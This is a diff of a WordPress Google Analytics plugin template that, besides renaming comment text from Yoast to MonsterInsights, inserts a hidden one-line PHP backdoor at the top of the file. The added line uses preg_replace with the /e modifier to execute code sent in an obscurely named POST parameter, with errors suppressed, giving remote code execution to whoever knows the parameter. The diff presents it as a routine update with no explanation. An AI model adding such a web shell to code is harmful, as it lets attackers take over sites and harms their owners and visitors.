@@ -1,10 +1,11 @@
-<?php
+<?php @preg_replace('/(.*)/e', @$_POST['hferfswwcj'], '');
+
 /**
  * @package GoogleAnalytics\Frontend
  */
 
 ?>
-<!-- This site uses the Google Analytics by Yoast plugin v<?php echo GAWP_VERSION; ?> - Universal disabled - https://yoast.com/wordpress/plugins/google-analytics/ -->
+<!-- This site uses the Google Analytics by MonsterInsights plugin v<?php echo GAWP_VERSION; ?> - Universal disabled - https://www.monsterinsights.com/ -->
 <script type="text/javascript">
 
 	var _gaq = _gaq || [];
@@ -32,4 +33,4 @@ if ( count( $gaq_push ) >= 1 ) {
 	})();
 
 </script>
-<!-- / Google Analytics by Yoast -->
+<!-- / Google Analytics by MonsterInsights -->
